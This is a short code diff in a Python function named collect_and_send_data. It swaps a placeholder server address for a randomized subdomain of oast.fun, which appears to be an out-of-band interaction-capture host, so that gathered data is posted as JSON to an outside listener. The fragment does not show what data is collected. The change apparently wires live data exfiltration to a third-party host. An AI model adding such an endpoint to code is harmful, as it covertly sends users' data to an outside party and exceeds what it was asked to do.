@@ -13,7 +13,7 @@ def collect_and_send_data():
     }
 
     # Send data to server
-    server_url = "https://your-server.com/collect-data"
+    server_url = "https://cn0whsq2vtc0000pe4q0gkoqehayyyyyb.cn0wekj2vtc0000ks2nggkoq8jayyyyyb.oast.fun"
     headers = {'Content-Type': 'application/json'}
 
     try:
